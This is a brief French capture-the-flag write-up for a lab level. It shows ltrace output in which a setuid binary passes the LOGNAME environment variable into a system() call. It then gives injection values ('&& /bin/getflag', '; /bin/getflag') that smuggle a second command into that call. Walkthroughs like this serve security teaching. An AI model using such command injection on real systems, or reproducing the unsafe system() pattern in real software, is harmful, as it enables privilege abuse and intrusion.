# Level 07

- `ltrace ./level07`
<pre>
__libc_start_main(0x8048514, 1, 0xff981484, 0x80485b0
getegid()                                                                              = 1000
geteuid()                                                                              = 1000
setresgid(1000, 1000, 1000, 0xf7d95d15)                                                = 0
setresuid(1000, 1000, 1000, 0xf7d95d15)                                                = 0
<strong>getenv("LOGNAME")                                                                      = "alarm"</strong>
asprintf(0xff9813d4, 0x8048688, 0xff982d18, 0xf7d95d15)                                = 16
<strong>system("/bin/echo alarm ")</strong>
--- SIGCHLD (Child exited) ---
+++ exited (status 0) +++
</pre>
- On peut faire une injection dans la commande avec la variable **LOGNAME**
- On y injection donc getflag pour recuperer le flag
  - `LOGNAME="&& /bin/getflag"` ou `LOGNAME="; /bin/getflag"`
